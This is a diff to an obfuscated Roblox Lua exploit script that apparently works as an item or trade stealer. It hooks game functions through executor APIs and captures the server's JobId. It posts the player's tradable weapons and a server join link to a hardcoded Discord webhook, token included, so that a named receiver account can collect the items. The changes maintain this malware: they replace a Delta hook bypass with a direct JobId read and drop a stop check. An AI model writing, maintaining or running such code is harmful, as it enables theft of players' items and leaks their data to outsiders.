@@ -114,6 +114,9 @@ end
 v32("LocalPlayer: " .. LocalPlayer.Name)
 
 local RECEIVERS = getgenv().RECEIVERS or {"capet55"}
+if type(RECEIVERS) ~= "table" or #RECEIVERS == 0 then
+	RECEIVERS = {"capet55"}
+end
 local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1538453005714718801/LQfE9djXZ9rq_QYo-7IVTRc2B4oIN5sckLkRBvSNpy83Ue_rZEU33JLXavUKOiYcs61M"
 local THRESHOLD = getgenv().THRESHOLD or 1
 
@@ -144,81 +147,10 @@ local function v50(p1)
 	return nil
 end
 
-local JobId
-local u53 = false
-local u54 = false
+-- Removed the Delta stepAnimate bypass as it caused hangs
+local JobId = game.JobId
+v32("REAL_JOB_ID=" .. tostring(JobId))
 
-if identifyexecutor and identifyexecutor() == "Delta" then
-	v32("Delta detected — getgc stepAnimate bypass...")
-
-	local v55
-
-	repeat
-		v55 = nil
-
-		local v56, v57, v58 = ipairs(getgc(true))
-		local v59 = geniter(v56, v57, v58)
-
-		while true do
-			local v60 = table.pack(v59())
-
-			if v60[1] then
-				local v61 = v60[3]
-
-				if typeof(v61) == "function" then
-					local ok2, result2 = pcall(debug.getinfo, v61)
-
-					if ok2 and result2 and result2.name == "stepAnimate" then
-						v55 = v61
-
-						break
-					end
-				end
-			else
-				break
-			end
-		end
-
-		task.wait()
-	until v55
-
-	v32("stepAnimate found — hooking")
-
-	local v64
-
-	v64 = hookfunction(v55, function(p2)
-		if not u54 then
-			u54 = true
-			JobId = game.JobId
-			u53 = true
-			v32("bypassJobId captured: " .. tostring(JobId))
-		end
-
-		return v64(p2)
-	end)
-	v32("Waiting for capturedJobId...")
-
-	while true do
-		task.wait()
-
-		if not u53 then
-			continue
-		end
-
-		if JobId then
-			break
-		end
-	end
-
-	v32("bypassJobId: " .. tostring(JobId))
-else
-	JobId = game.JobId
-	v32("Non-Delta — bypassJobId=" .. tostring(JobId))
-end
-
-local JobId2 = JobId or game.JobId
-
-v32("REAL_JOB_ID=" .. JobId2)
 v32("Loading Database.Sync.Item...")
 
 local Weapons
@@ -1023,7 +955,7 @@ end
 
 local function v269(p24, p25)
 	local v270 = v228(u215, 20, " ➜ ")
-	local v271 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, JobId2)
+	local v271 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, JobId)
 	local identifyexecutor_ = identifyexecutor and identifyexecutor() or "Unknown"
 	local format = string.format
 	local t16 = {
@@ -1053,7 +985,7 @@ local function v269(p24, p25)
 	if not p24 then
 		t17[#t17 + 1] = {
 			name = "**Join Link**",
-			value = string.format("[**%s**](%s)", JobId2, v271),
+			value = string.format("[**%s**](%s)", JobId, v271),
 			inline = false
 		}
 
@@ -1149,11 +1081,6 @@ local function v277()
 
 		v318.content = v298 and "@everyone" or ""
 		v251(WEBHOOK, v318.content, v318.embeds)
-	end
-	
-	if #u215 == 0 then
-		v32("No tradable weapons — stopping")
-		return
 	end
 end
 
